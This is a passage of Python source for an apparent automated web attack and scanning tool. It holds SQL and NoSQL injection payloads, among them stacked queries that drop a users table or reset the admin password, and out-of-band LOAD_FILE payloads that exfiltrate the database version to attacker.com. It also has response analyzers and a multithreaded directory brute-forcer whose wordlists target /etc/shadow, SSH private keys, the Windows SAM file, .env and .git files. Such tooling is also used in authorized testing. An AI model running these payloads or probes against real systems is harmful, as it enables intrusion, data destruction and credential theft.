            "' AND extractvalue(1, concat(0x5c, (SELECT @@version))) -- ",

            # UNION with column detection
            "' ORDER BY 1 -- ",
            "' ORDER BY 10 -- ",
            "' UNION SELECT 1,2,3,4,5,6,7,8,9,10 -- ",

            # Stacked queries
            "'; DROP TABLE users -- ",
            "'; UPDATE users SET password='hacked' WHERE username='admin' -- ",

            # Out-of-band
            "' UNION SELECT LOAD_FILE('\\\\attacker.com\\share\\test.txt') -- ",
            "' AND (SELECT LOAD_FILE(CONCAT('\\\\',(SELECT @@version),'.attacker.com\\test.txt'))) -- ",

            # JSON injection
            '{"username": {"$ne": null}, "password": {"$ne": null}}',
            '{"$where": "this.username == \'admin\' && this.password == \'test\'"}',

            # NoSQL advanced
            '{"username": "admin", "password": {"$regex": "^.*$"}}',
            '{"$or": [{"username": "admin"}, {"password": {"$exists": true}}]}',

            # Second-order SQLi
            "admin' WHERE '1'='1",
            "test' AND '1'='1' -- ",
        ]

        payloads.extend(advanced)
        return list(set(payloads))[:100]  # Limit to 100 unique payloads






# --- ENHANCED RESPONSE ANALYSIS ENGINE ---
class EnhancedResponseAnalyzer:
    """Advanced response analysis with machine learning patterns"""

    def __init__(self):
        self.sql_patterns = self._load_sql_patterns()
        self.xss_patterns = self._load_xss_patterns()
        self.rce_patterns = self._load_rce_patterns()


    def _load_xss_patterns(self):
        """Load XSS detection patterns"""
        return [
            r'<script[^>]*>',
            r'on\w+\s*=',
            r'javascript:',
            r'data:text/html',
            r'<iframe[^>]*src',
            r'<svg[^>]*onload',
            r'<img[^>]*onerror',
            r'<body[^>]*onload',
            r'<input[^>]*onfocus',
            r'alert\s*\(|prompt\s*\(|confirm\s*\(',
            r'document\.(cookie|location|domain)',
            r'window\.location',
            r'<marquee[^>]*onstart',
            r'<details[^>]*ontoggle',
        ]

    def _load_rce_patterns(self):
        """Load RCE detection patterns"""
        return {
            'unix': [
                r'root:x:\d+:\d+:',
                r'bin/.*lib',
                r'total\s+\d+',
                r'uid=\d+\(\w+\)\s+gid=',
                r'Permission denied',
                r'command not found',
                r'bash:.*not found',
                r'/bin/(bash|sh):',
            ],
            'windows': [
                r'\[boot loader\]',
                r'\[drivers\]',
                r'Volume Serial Number',
                r'Directory of',
                r'Account active.*Yes',
                r'Local Group Memberships',
                r'C:\\Windows\\',
                r'Program Files',
            ]
        }

    def _load_sql_patterns(self):
        """Load SQL error patterns"""
        return {
            'mysql': [
                r"(?i)mysql.*error",
                r"(?i)you have an error in your sql syntax",
                r"(?i)warning: mysql",
                r"(?i)got error.*from mysql",
                r"(?i)mysql_fetch",
                r"(?i)supplied argument is not a valid mysql",
                r"(?i)unexpected token.*mysql",
                r"(?i)mysql.*driver",
            ],
            'postgres': [
                r"(?i)postgresql.*error",
                r"(?i)pg_.*error",
                r"(?i)postgres query failed",
                r"(?i)could not determine data type",
                r"(?i)operator does not exist",
            ],
            'oracle': [
                r"(?i)ora-\d{5}",
                r"(?i)oracle.*error",
                r"(?i)pl/sql.*error",
                r"(?i)oracle driver",
            ],
            'mssql': [
                r"(?i)microsoft.*odbc",
                r"(?i)sql server.*error",
                r"(?i)sqlcmd.*error",
                r"(?i)unclosed quotation mark",
            ],
            'generic': [
                r"(?i)syntax error",
                r"(?i)sql.*error",
                r"(?i)database.*error",
                r"(?i)invalid.*sql",
                r"(?i)sql statement",
            ]
        }

    def analyze_sql_injection(self, baseline: str, test: str,
                              baseline_time: float, test_time: float,
                              payload: str) -> Tuple[int, List[str], Dict]:
        """Enhanced SQL injection analysis"""
        confidence = 0
        indicators = []
        evidence = {}

        # Check for SQL errors
        for db_type, patterns in self.sql_patterns.items():
            for pattern in patterns:
                matches = re.findall(pattern, test, re.IGNORECASE)
                if matches:
                    indicators.append(f"{db_type.upper()} error detected: {pattern}")
                    confidence += 30
                    evidence[f"{db_type}_errors"] = matches[:3]
                    break

        # Check for differences
        baseline_words = set(re.findall(r'\b\w+\b', baseline.lower()))
        test_words = set(re.findall(r'\b\w+\b', test.lower()))
        new_words = test_words - baseline_words

        sql_keywords = {'select', 'from', 'where', 'union', 'join', 'table',
                        'database', 'schema', 'column', 'row', 'insert', 'update',
                        'delete', 'create', 'alter', 'drop', 'grant', 'revoke'}

        found_keywords = new_words & sql_keywords
        if found_keywords:
            indicators.append(f"SQL keywords found: {', '.join(found_keywords)}")
            confidence += len(found_keywords) * 5
            evidence['sql_keywords'] = list(found_keywords)

        # Time-based detection
        time_diff = test_time - baseline_time
        if time_diff > 2:
            indicators.append(f"Time delay: {time_diff:.2f}s (possible blind SQLi)")
            confidence += min(40, time_diff * 10)
            evidence['time_delay'] = time_diff

        # Content length analysis
        baseline_len = len(baseline)
        test_len = len(test)
        if baseline_len > 0:
            diff_ratio = abs(test_len - baseline_len) / baseline_len
            if diff_ratio > 0.3:
                indicators.append(f"Content length changed by {diff_ratio * 100:.1f}%")
                confidence += min(30, diff_ratio * 100)
                evidence['length_change'] = diff_ratio

        # Check for database information
        db_info_patterns = {
            'version': r'(?i)(version|@@version|version\(\))',
            'user': r'(?i)(user|current_user|session_user)',
            'database': r'(?i)(database|db_name)',
        }

        for info_type, pattern in db_info_patterns.items():
            if re.search(pattern, test, re.IGNORECASE):
                indicators.append(f"Database {info_type} possibly exposed")
                confidence += 15
                evidence[f'db_{info_type}'] = True

        # Check for data leakage
        sensitive_patterns = {
            'password': r'(?i)password.*:.*[a-z0-9]',
            'email': r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}',
            'credit_card': r'\b\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4}\b',
            'ssn': r'\b\d{3}[\s-]?\d{2}[\s-]?\d{4}\b',
        }

        for sens_type, pattern in sensitive_patterns.items():
            matches = re.findall(pattern, test)
            if matches and sens_type not in baseline.lower():
                indicators.append(f"Possible {sens_type} leakage")
                confidence += 20
                evidence[f'sensitive_{sens_type}'] = matches[:2]

        return min(confidence, 100), indicators, evidence

    def analyze_xss(self, baseline: str, test: str, payload: str) -> Tuple[int, List[str], Dict]:
        """Enhanced XSS analysis"""
        confidence = 0
        indicators = []
        evidence = {}

        # Check for direct reflection
        if payload in test:
            indicators.append("Payload directly reflected")
            confidence += 60
            evidence['direct_reflection'] = True

        # Check for encoded reflection
        encoded_variants = [
            html.escape(payload),
            payload.replace('<', '&lt;').replace('>', '&gt;'),
            quote(payload),
            base64.b64encode(payload.encode()).decode(),
        ]

        for variant in encoded_variants:
            if variant in test:
                indicators.append("Payload reflected (encoded)")
                confidence += 40
                evidence['encoded_reflection'] = True
                break

        # Check for script execution contexts
        script_patterns = [
            r'<script[^>]*>.*?</script>',
            r'on\w+\s*=\s*["\'][^"\']*["\']',
            r'javascript:\s*[^"\'>]+',
            r'data:\s*text/html[^>]*>',
            r'<svg[^>]*onload[^>]*>',
            r'<iframe[^>]*src\s*=\s*["\']javascript:',
        ]

        for pattern in script_patterns:
            matches = re.findall(pattern, test, re.IGNORECASE)
            if matches:
                indicators.append(f"Script context found: {pattern[:50]}...")
                confidence += 30
                evidence['script_contexts'] = matches[:3]

        # Check for attribute injection
        attr_patterns = [
            r'<\w+[^>]*\s\w+\s*=\s*["\'][^"\']*' + re.escape(payload) + r'[^"\']*["\'][^>]*>',
            r'<\w+[^>]*' + re.escape(payload) + r'[^>]*>',
        ]

        for pattern in attr_patterns:
            if re.search(pattern, test, re.IGNORECASE):
                indicators.append("Attribute injection possible")
                confidence += 25
                evidence['attribute_injection'] = True

        # Check for DOM-based XSS patterns
        dom_patterns = [
            r'(?i)document\.(location|URL|URLUnencoded|referrer|cookie)',
            r'(?i)window\.(location|name)',
            r'(?i)location\.(href|hash|search)',
            r'(?i)eval\s*\(|setTimeout\s*\(|setInterval\s*\(',
            r'(?i)innerHTML|outerHTML|insertAdjacentHTML',
        ]

        dom_found = []
        for pattern in dom_patterns:
            if re.search(pattern, test):
                dom_found.append(pattern)

        if dom_found:
            indicators.append(f"DOM manipulation patterns: {', '.join(dom_found[:3])}")
            confidence += 20
            evidence['dom_patterns'] = dom_found

        return min(confidence, 100), indicators, evidence

    def analyze_command_injection(self, baseline: str, test: str,
                                  payload: str) -> Tuple[int, List[str], Dict]:
        """Enhanced command injection analysis"""
        confidence = 0
        indicators = []
        evidence = {}

        # Check for command output
        command_outputs = {
            'unix': [
                (r'root:x:\d+:\d+:', '/etc/passwd file'),
                (r'bin(/|:).*lib', 'Unix directory structure'),
                (r'total\s+\d+', 'ls -la output'),
                (r'uid=\d+\(\w+\)\s+gid=', 'id command output'),
                (r'\w+\s+\w+\s+\d+\s+\d+:\d+\s+', 'ls -l output'),
                (r'Permission denied', 'Command error'),
                (r'command not found', 'Shell error'),
            ],
            'windows': [
                (r'\[boot loader\]', 'boot.ini file'),
                (r'\[drivers\]', 'system.ini file'),
                (r'Volume Serial Number', 'dir command output'),
                (r'Directory of', 'dir command output'),
                (r'Account active.*Yes', 'net user output'),
                (r'Local Group Memberships', 'net user output'),
            ],
        }

        for os_type, patterns in command_outputs.items():
            for pattern, description in patterns:
                if re.search(pattern, test, re.IGNORECASE):
                    indicators.append(f"{os_type} command output: {description}")
                    confidence += 40
                    evidence[f'{os_type}_output'] = description
                    break

        # Check for command execution errors
        error_patterns = [
            r'(?i)(bash|sh|cmd|powershell).*(not found|error|failed)',
            r'(?i)syntax error.*command line',
            r'(?i)cannot execute.*command',
            r'(?i)permission denied',
        ]

        for pattern in error_patterns:
            if re.search(pattern, test, re.IGNORECASE):
                indicators.append(f"Command execution error: {pattern}")
                confidence += 25
                evidence['execution_errors'] = True

        # Check for process information
        process_patterns = [
            r'\b(pid|ppid)\s*[:=]\s*\d+',
            r'\bUSER\s+PID\s+%CPU\s+%MEM',
            r'\bImage Name\s+PID\s+Session Name',
        ]

        for pattern in process_patterns:
            if re.search(pattern, test, re.IGNORECASE):
                indicators.append("Process information leaked")
                confidence += 30
                evidence['process_info'] = True

        # Check for network information
        network_patterns = [
            r'\b(eth|ens|wlan)\d+:',
            r'\binet\s+\d+\.\d+\.\d+\.\d+',
            r'\bActive Connections',
            r'\bProto\s+Local Address',
        ]

        for pattern in network_patterns:
            if re.search(pattern, test, re.IGNORECASE):
                indicators.append("Network information leaked")
                confidence += 20
                evidence['network_info'] = True

        return min(confidence, 100), indicators, evidence


# --- ENHANCED INPUT DISCOVERY ENGINE ---
class InputDiscoveryEngine:
    """Advanced input parameter discovery"""

    def __init__(self, session: requests.Session):
        self.session = session
        self.input_patterns = self._load_input_patterns()

    def _load_input_patterns(self):
        """Load patterns for finding input parameters"""
        return {
            'html_inputs': [
                (r'<input[^>]*name\s*=\s*["\']([^"\']+)["\'][^>]*>', 'input'),
                (r'<textarea[^>]*name\s*=\s*["\']([^"\']+)["\'][^>]*>', 'textarea'),
                (r'<select[^>]*name\s*=\s*["\']([^"\']+)["\'][^>]*>', 'select'),
                (r'<button[^>]*name\s*=\s*["\']([^"\']+)["\'][^>]*>', 'button'),
            ],
            'js_variables': [
                (r'var\s+(\w+)\s*=\s*[^;]+;', 'javascript'),
                (r'let\s+(\w+)\s*=\s*[^;]+;', 'javascript'),
                (r'const\s+(\w+)\s*=\s*[^;]+;', 'javascript'),
                (r'\$\.(?:get|post|ajax)\([^)]*data\s*:\s*\{([^}]+)\}', 'jquery'),
                (r'fetch\([^)]*body\s*:\s*([^,)]+)', 'fetch'),
                (r'axios\.(?:get|post)\([^)]*data\s*:\s*([^,)]+)', 'axios'),
            ],
            'url_patterns': [
                (r'[\?&]([^=&]+)=', 'query_param'),
                (r'/(api|v\d+)/([^/?]+)', 'rest_endpoint'),
                (r'\.(json|xml|api)\b', 'api_extension'),
            ],
            'headers': [
                (r'X-([\w-]+)', 'custom_header'),
                (r'(Authorization|Cookie|Token)', 'auth_header'),
            ]
        }

    def discover_from_html(self, html_content: str, base_url: str) -> List[Dict]:
        """Discover input parameters from HTML"""
        inputs = []
        soup = BeautifulSoup(html_content, 'html.parser')

        # Find forms
        for form in soup.find_all('form'):
            form_data = {
                'url': urljoin(base_url, form.get('action', '')),
                'method': form.get('method', 'GET').upper(),
                'inputs': [],
                'source': 'html_form'
            }

            # Get form inputs
            for input_tag in form.find_all(['input', 'textarea', 'select']):
                name = input_tag.get('name')
                if name:
                    input_info = {
                        'name': name,
                        'type': input_tag.get('type', 'text'),
                        'value': input_tag.get('value', ''),
                        'tag': input_tag.name
                    }
                    form_data['inputs'].append(input_info)

            if form_data['inputs']:
                inputs.append(form_data)

        # Find standalone inputs (AJAX forms)
        for pattern, source in self.input_patterns['html_inputs']:
            matches = re.findall(pattern, html_content)
            for match in matches:
                if isinstance(match, tuple):
                    name = match[0]
                else:
                    name = match

                inputs.append({
                    'url': base_url,
                    'method': 'POST',  # Assume POST for standalone
                    'inputs': [{'name': name, 'type': 'text', 'value': '', 'tag': 'input'}],
                    'source': f'html_{source}'
                })

        return inputs

    def discover_from_js(self, js_content: str, base_url: str) -> List[Dict]:
        """Discover input parameters from JavaScript"""
        inputs = []

        for pattern, source in self.input_patterns['js_variables']:
            matches = re.findall(pattern, js_content, re.DOTALL)
            for match in matches:
                if source in ['jquery', 'fetch', 'axios']:
                    # Parse JSON-like data
                    try:
                        data_str = match.strip()
                        if data_str.startswith('{') and data_str.endswith('}'):
                            # Simple JSON parsing
                            params = re.findall(r'"([^"]+)"\s*:', data_str)
                            for param in params:
                                inputs.append({
                                    'url': base_url,
                                    'method': 'POST',
                                    'inputs': [{'name': param, 'type': 'text', 'value': ''}],
                                    'source': f'js_{source}'
                                })
                    except:
                        pass
                else:
                    inputs.append({
                        'url': base_url,
                        'method': 'POST',
                        'inputs': [{'name': match, 'type': 'text', 'value': ''}],
                        'source': f'js_{source}'
                    })

        return inputs

    def discover_from_url(self, url: str) -> List[Dict]:
        """Discover parameters from URL patterns"""
        inputs = []
        parsed = urlparse(url)

        # Query parameters
        if parsed.query:
            params = parse_qs(parsed.query)
            for param in params:
                inputs.append({
                    'url': url.split('?')[0],
                    'method': 'GET',
                    'inputs': [{'name': param, 'type': 'text', 'value': params[param][0]}],
                    'source': 'url_query'
                })

        # RESTful parameters
        path_parts = parsed.path.strip('/').split('/')
        if len(path_parts) > 1:
            # Assume last part could be a parameter
            last_part = path_parts[-1]
            if re.match(r'^\d+$', last_part) or re.match(r'^[a-f0-9-]{36}$', last_part):
                inputs.append({
                    'url': '/'.join(url.split('/')[:-1]),
                    'method': 'GET',
                    'inputs': [{'name': 'id', 'type': 'text', 'value': last_part}],
                    'source': 'url_path'
                })

        return inputs


# --- ENHANCED DIRECTORY DISCOVERY ---
class DirectoryBruteforcer:
    """Enhanced directory and file discovery"""

    def __init__(self, session: requests.Session):
        self.session = session
        self.wordlists = self._load_wordlists()

    def _load_wordlists(self):
        """Load directory and file wordlists"""
        return {
            'common_dirs': [
                'admin', 'administrator', 'backend', 'dashboard',
                'login', 'signin', 'register', 'signup',
                'api', 'graphql', 'swagger', 'redoc',
                'wp-admin', 'wp-content', 'wp-includes',
                'config', 'backup', 'dump', 'sql',
                'static', 'assets', 'images', 'uploads',
                'download', 'downloads', 'files', 'docs',
                'private', 'secret', 'hidden', 'secure',
                'test', 'demo', 'dev', 'development',
                'cgi-bin', 'cgi', 'scripts', 'bin',
            ],
            'common_files': [
                'robots.txt', 'sitemap.xml', 'crossdomain.xml',
                'clientaccesspolicy.xml', 'security.txt',
                '.env', '.git', '.svn', '.htaccess',
                'phpinfo.php', 'test.php', 'info.php',
                'config.php', 'settings.php', 'database.php',
                'web.config', 'app.config', 'config.json',
                'package.json', 'composer.json', 'yarn.lock',
                'README.md', 'LICENSE', 'CHANGELOG',
                'index.php', 'index.html', 'index.jsp',
                'admin.php', 'login.php', 'register.php',
                'api.json', 'swagger.json', 'graphql',
            ],
            'api_endpoints': [
                'api/v1', 'api/v2', 'api/v3',
                'v1/api', 'v2/api', 'v3/api',
                'graphql', 'graphiql', 'playground',
                'rest', 'soap', 'xmlrpc',
                'users', 'products', 'orders',
                'auth', 'token', 'oauth',
                'search', 'query', 'filter',
            ],
            'sensitive_files': [
                'passwd', 'shadow', 'group', 'hosts',
                'win.ini', 'system.ini', 'boot.ini',
                '.bash_history', '.ssh/id_rsa',
                '.mysql_history', '.psql_history',
                'backup.zip', 'dump.sql', 'backup.tar',
                'error.log', 'access.log', 'debug.log',
            ]
        }

    def brute_force(self, base_url: str, depth: int = 1) -> List[Dict]:
        """Brute force directories and files"""
        results = []

        # Combine all wordlists based on depth
        targets = []
        if depth >= 1:
            targets.extend(self.wordlists['common_dirs'])
            targets.extend(self.wordlists['common_files'])

        if depth >= 2:
            targets.extend(self.wordlists['api_endpoints'])

        if depth >= 3:
            targets.extend(self.wordlists['sensitive_files'])

        # Test each target
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            futures = []
            for target in set(targets):
                futures.append(executor.submit(self._test_target, base_url, target))

            for future in concurrent.futures.as_completed(futures):
                result = future.result()
                if result:
                    results.append(result)

        return results

    def _test_target(self, base_url: str, target: str) -> Optional[Dict]:
        """Test a single target"""
        url = urljoin(base_url.rstrip('/') + '/', target)

        try:
            # Try HEAD first (faster)
            resp = self.session.head(url, timeout=5, verify=False)

            if resp.status_code < 400:
                # If HEAD not allowed, try GET
                if resp.status_code == 405:
                    resp = self.session.get(url, timeout=5, verify=False)

                content_type = resp.headers.get('Content-Type', '')
                content_length = resp.headers.get('Content-Length', '0')

                return {
                    'url': url,
                    'status': resp.status_code,
                    'content_type': content_type,
                    'content_length': content_length,
                    'headers': dict(resp.headers),
                    'is_directory': self._is_directory(resp, target)
                }

        except Exception as e:
            logger.debug(f"Directory check failed for {url}: {e}")

        return None

    def _is_directory(self, response, target: str) -> bool:
        """Check if the response indicates a directory"""
        content_type = response.headers.get('Content-Type', '')

        # Common directory indicators
        if 'text/html' in content_type:
            # Check for directory listing
            html_content = response.text if hasattr(response, 'text') else ''
            dir_listing_patterns = [
                r'<title>Index of',
                r'<h1>Directory listing',
                r'Parent Directory</a>',
                r'Directory Listing',
            ]

            for pattern in dir_listing_patterns:
                if re.search(pattern, html_content, re.IGNORECASE):
                    return True

        # No extension often indicates directory
        if '.' not in target:
            return True

        return False


# Replace the DirectoryBruteforcer class with this enhanced version:

class EnhancedDirectoryBruteforcer:
    """Advanced recursive directory and endpoint discovery"""

    def __init__(self, session: requests.Session):
        self.session = session
        self.wordlists = self._load_enhanced_wordlists()
        self.discovered_paths = []
        self.discovered_endpoints = []

    def _load_enhanced_wordlists(self):
        """Load comprehensive wordlists for discovery"""
        return {
            # Common directories
            'common_dirs': [
                'admin', 'administrator', 'backend', 'dashboard', 'console',
                'login', 'signin', 'register', 'signup', 'logout',
                'api', 'graphql', 'swagger', 'redoc', 'openapi',
                'wp-admin', 'wp-content', 'wp-includes', 'wp-login.php',
                'config', 'backup', 'dump', 'sql', 'database',
                'static', 'assets', 'images', 'uploads', 'media',
                'download', 'downloads', 'files', 'docs', 'documents',
                'private', 'secret', 'hidden', 'secure', 'protected',
                'test', 'demo', 'dev', 'development', 'staging',
                'cgi-bin', 'cgi', 'scripts', 'bin', 'cron',
                'web', 'www', 'public', 'html', 'htdocs',
                'tmp', 'temp', 'cache', 'logs', 'error_log',
                'misc', 'includes', 'lib', 'library', 'modules',
                'vendor', 'plugins', 'themes', 'templates', 'layouts',
                'app', 'application', 'apps', 'system', 'framework',
                'user', 'users', 'account', 'accounts', 'profile',
                'search', 'find', 'query', 'filter', 'sort',
                'settings', 'options', 'preferences', 'configs',
                'help', 'support', 'contact', 'about', 'info',
                'blog', 'news', 'articles', 'posts', 'forum',
                'shop', 'store', 'cart', 'checkout', 'payment',
                'service', 'services', 'api-services', 'rest-api',
                'v1', 'v2', 'v3', 'latest', 'current',
                'auth', 'authentication', 'oauth', 'token', 'jwt',
                'monitoring', 'metrics', 'stats', 'analytics',
                'backdoor', 'shell', 'cmd', 'rce', 'exploit',
            ],

            # Common files
            'common_files': [
                # Configuration files
                '.env', '.env.example', '.env.local', '.env.production',
                '.htaccess', '.htpasswd', '.gitignore', '.gitconfig',
                'web.config', 'app.config', 'config.xml', 'settings.xml',
                'config.php', 'settings.php', 'database.php', 'db.php',
                'config.json', 'settings.json', 'config.yaml', 'config.yml',
                'package.json', 'composer.json', 'package-lock.json',
                'yarn.lock', 'Gemfile', 'Gemfile.lock', 'requirements.txt',
                'pom.xml', 'build.gradle', 'build.xml',

                # Security files
                'robots.txt', 'sitemap.xml', 'sitemap_index.xml',
                'crossdomain.xml', 'clientaccesspolicy.xml',
                'security.txt', '.well-known/security.txt',
                'phpinfo.php', 'test.php', 'info.php', 'phpmyadmin',
                'admin.php', 'login.php', 'register.php', 'install.php',

                # Documentation files
                'README.md', 'LICENSE', 'CHANGELOG.md', 'CHANGES.txt',
                'CONTRIBUTING.md', 'AUTHORS', 'INSTALL', 'UPGRADE',

                # Backup files
                'backup.zip', 'backup.tar', 'backup.tar.gz', 'backup.rar',
                'dump.sql', 'backup.sql', 'database.sql', 'db.sql',
                'backup.db', 'database.db', 'site.db',

                # Log files
                'error.log', 'access.log', 'debug.log', 'application.log',
                'server.log', 'apache.log', 'nginx.log', 'iis.log',

                # Source code files
                'index.php', 'index.html', 'index.jsp', 'index.aspx',
                'main.py', 'app.py', 'server.js', 'app.js',
                'main.rb', 'app.rb', 'application.rb',

                # Hidden files
                '.DS_Store', '.project', '.classpath', '.settings',
                '.idea/', '.vscode/', '.editorconfig',

                # API files
                'swagger.json', 'swagger.yaml', 'openapi.json',
                'api.json', 'api.yaml', 'graphql', 'graphiql',

                # Database files
                '.mysql_history', '.psql_history', '.rediscli_history',
                '.sqlite_history', '.mongorc.js',
            ],

            # API endpoints
            'api_endpoints': [
                # REST API patterns
                'api/v1', 'api/v2', 'api/v3', 'api/v4',
                'v1/api', 'v2/api', 'v3/api', 'v4/api',
                'rest/api', 'rest/v1', 'rest/v2',
                'services/rest', 'webservices/rest',

                # GraphQL endpoints
                'graphql', 'graphiql', 'playground',
                'api/graphql', 'v1/graphql', 'graphql/v1',

                # SOAP endpoints
                'soap', 'webservices', 'wsdl', 'services/soap',

                # Common API resources
                'users', 'user', 'customers', 'customer',
                'products', 'product', 'items', 'item',
                'orders', 'order', 'transactions', 'transaction',
                'auth', 'authentication', 'login', 'register',
                'token', 'tokens', 'refresh', 'oauth',
                'search', 'query', 'filter', 'sort',
                'upload', 'uploads', 'files', 'media',
                'notifications', 'messages', 'chat',
                'settings', 'config', 'profile',

                # API actions
                'create', 'update', 'delete', 'list',
                'get', 'post', 'put', 'patch',
            ],

            # Sensitive files and paths
            'sensitive_paths': [
                # System files
                '/etc/passwd', '/etc/shadow', '/etc/hosts',
                '/etc/hostname', '/etc/resolv.conf',
                '/proc/self/environ', '/proc/self/cmdline',
                '/proc/version', '/proc/cpuinfo',

                # Windows files
                'C:/Windows/win.ini', 'C:/Windows/system.ini',
                'C:/boot.ini', 'C:/Windows/System32/config/SAM',

                # SSH files
                '.ssh/id_rsa', '.ssh/id_dsa', '.ssh/authorized_keys',
                '.ssh/known_hosts', '.ssh/config',

                # Git files
                '.git/config', '.git/HEAD', '.git/index',
                '.git/logs/HEAD', '.git/refs/heads/master',

                # Database configs
                'config/database.yml', 'config/database.json',
                'db/schema.rb', 'migrations/',

                # Environment files
                '.env.production', '.env.staging', '.env.development',
                'config/environments/production.rb',
            ],

            # File extensions to test
            'file_extensions': [
                '.php', '.php3', '.php4', '.php5', '.php7', '.phtml',
                '.asp', '.aspx', '.ashx', '.asmx',
                '.jsp', '.jspx', '.do', '.action',
                '.html', '.htm', '.xhtml',
                '.xml', '.json', '.yaml', '.yml',
                '.txt', '.log', '.md',
                '.pdf', '.doc', '.docx', '.xls', '.xlsx',
                '.zip', '.tar', '.gz', '.rar', '.7z',
                '.sql', '.db', '.sqlite', '.mdb',
                '.bak', '.backup', '.old', '.tmp',
            ],

            # Common parameter names (for endpoint discovery)
            'parameters': [
                'id', 'user', 'username', 'email', 'password',
                'token', 'key', 'secret', 'api_key',
                'file', 'filename', 'path', 'url',
                'cmd', 'command', 'exec', 'system',
                'search', 'q', 'query', 'filter',
                'page', 'limit', 'offset', 'sort',
                'action', 'method', 'func', 'callback',
            ],
        }

    def recursive_discovery(self, base_url: str, max_depth: int = 3):
        """Recursive directory and endpoint discovery"""
        print(f"{Fore.BLUE}[*] Starting recursive discovery (depth: {max_depth}){Style.RESET_ALL}")

        # Queue for BFS traversal: (url, depth)
        queue = [(base_url.rstrip('/'), 0)]
        visited = set()

        while queue:
            current_url, depth = queue.pop(0)

            if depth > max_depth or current_url in visited:
                continue

            visited.add(current_url)

            try:
                # Get the page content
                response = self.session.get(current_url, timeout=10, verify=False)

                if response.status_code < 400:
                    # Analyze the page for links and endpoints
                    self._analyze_page(current_url, response.text, depth, queue)

                    # Try common directories and files at this level
                    self._bruteforce_at_level(current_url, depth)

                    print(f"{Fore.GREEN}[+] Discovered: {current_url} (depth: {depth}){Style.RESET_ALL}")

            except Exception as e:
                logger.debug(f"Discovery error for {current_url}: {e}")

        print(
            f"{Fore.GREEN}[+] Recursive discovery complete: {len(self.discovered_paths)} paths found{Style.RESET_ALL}")
        return self.discovered_paths

    def _analyze_page(self, url: str, content: str, depth: int, queue: list):
        """Analyze HTML page for links, forms, and endpoints"""
        soup = BeautifulSoup(content, 'html.parser')

        # Find all links
        for link in soup.find_all('a', href=True):
            href = link['href']
            if href and not href.startswith(('#', 'javascript:', 'mailto:')):
                absolute_url = urljoin(url, href)

                # Clean URL
                absolute_url = self._clean_url(absolute_url)

                # Check if it's within the same domain
                if urlparse(absolute_url).netloc == urlparse(url).netloc:
                    # Add to discovery results
                    if self._is_interesting_path(absolute_url):
                        self._add_discovered_path(absolute_url, 'html_link', depth + 1)

                    # Add to queue for further crawling
                    if depth + 1 <= 3:  # Limit recursion depth for links
                        queue.append((absolute_url, depth + 1))

        # Find all forms
        for form in soup.find_all('form'):
            action = form.get('action', '')
            if action:
                form_url = urljoin(url, action)
                form_url = self._clean_url(form_url)

                if urlparse(form_url).netloc == urlparse(url).netloc:
                    self._add_discovered_path(form_url, 'html_form', depth)

                    # Extract form parameters as potential endpoints
                    self._extract_form_endpoints(form, form_url)

        # Find JavaScript endpoints
        js_endpoints = self._extract_js_endpoints(content, url)
        for endpoint in js_endpoints:
            self._add_discovered_path(endpoint, 'javascript', depth)

        # Find API-like patterns in URLs
        api_patterns = self._find_api_patterns(url, content)
        for pattern in api_patterns:
            self._add_discovered_path(pattern, 'api_pattern', depth)

    def _bruteforce_at_level(self, base_url: str, depth: int):
        """Bruteforce common paths at a specific directory level"""
        print(f"{Fore.CYAN}[*] Bruteforcing at: {base_url} (depth: {depth}){Style.RESET_ALL}")

        # Combine targets based on depth
        targets = []

        # Always test common directories
        targets.extend([f"{dir}/" for dir in self.wordlists['common_dirs'][:50]])

        # Test common files at this level
        targets.extend(self.wordlists['common_files'][:30])

        # Test API endpoints at deeper levels
        if depth >= 1:
            targets.extend(self.wordlists['api_endpoints'][:20])

        # Test sensitive paths at deeper levels
        if depth >= 2:
            targets.extend(self.wordlists['sensitive_paths'][:15])

        # Test with file extensions
        if '.' not in base_url.split('/')[-1]:  # If current URL is a directory
            for ext in self.wordlists['file_extensions'][:10]:
                targets.append(f"index{ext}")
                targets.append(f"main{ext}")
                targets.append(f"app{ext}")

        # Test parameter-based endpoints
        for param in self.wordlists['parameters'][:10]:
            targets.append(f"?{param}=test")
            targets.append(f"?{param}=1")

        # Test numeric IDs
        for i in range(1, 6):
            targets.append(str(i))
            targets.append(f"id/{i}")

        # Test UUID patterns
        targets.append("00000000-0000-0000-0000-000000000000")
        targets.append("test")
        targets.append("admin")

        # Test each target
        with concurrent.futures.ThreadPoolExecutor(max_workers=15) as executor:
            futures = []
            for target in set(targets):
                if target:
                    futures.append(executor.submit(self._test_single_target, base_url, target, depth))

            for future in concurrent.futures.as_completed(futures):
                try:
                    result = future.result()
                    if result:
                        self.discovered_paths.append(result)
                except Exception as e:
                    logger.debug(f"Bruteforce error: {e}")

    def _test_single_target(self, base_url: str, target: str, depth: int) -> Optional[Dict]:
        """Test a single target path"""
        # Clean the target
        if target.startswith('?'):
            # It's a query parameter
            test_url = f"{base_url}{target}"
        elif '/' in target and not target.startswith('/'):
            # Relative path
            test_url = urljoin(base_url + '/', target)
        else:
            # Absolute or relative
            test_url = urljoin(base_url.rstrip('/') + '/', target.lstrip('/'))

        test_url = self._clean_url(test_url)

        # Skip if already discovered
        if any(p['url'] == test_url for p in self.discovered_paths):
            return None

        try:
            # Try HEAD first (faster)
            resp = self.session.head(test_url, timeout=5, verify=False, allow_redirects=True)

            if resp.status_code == 405:  # HEAD not allowed
                resp = self.session.get(test_url, timeout=5, verify=False, allow_redirects=True)

            # Convert status to int for consistent comparison
            status_code = int(resp.status_code)

            # Check response - include 401, 403, 500 as interesting
            if status_code < 400 or status_code in [401, 403, 500]:
                content_type = resp.headers.get('Content-Type', '')
                content_length = resp.headers.get('Content-Length', '0')

                # Convert content_length to int if possible
                try:
                    content_length = int(content_length)
                except:
                    content_length = 0

                result = {
                    'url': test_url,
                    'status': status_code,  # Ensure this is int
                    'content_type': content_type,
                    'content_length': content_length,
                    'headers': dict(resp.headers),
                    'depth': depth,
                    'source': 'bruteforce',
                    'is_directory': self._is_directory(resp, target),
                    'is_file': self._is_file(target, content_type),
                    'is_api': self._is_api_endpoint(test_url, content_type),
                }

                # If it's a directory, add trailing slash for consistency
                if result['is_directory'] and not test_url.endswith('/'):
                    result['url'] = test_url + '/'

                # Log interesting findings
                if status_code == 200:
                    logger.info(f"Found: {test_url} ({status_code})")

                    # Check for interesting content
                    if self._has_interesting_content(resp):
                        result['interesting'] = True
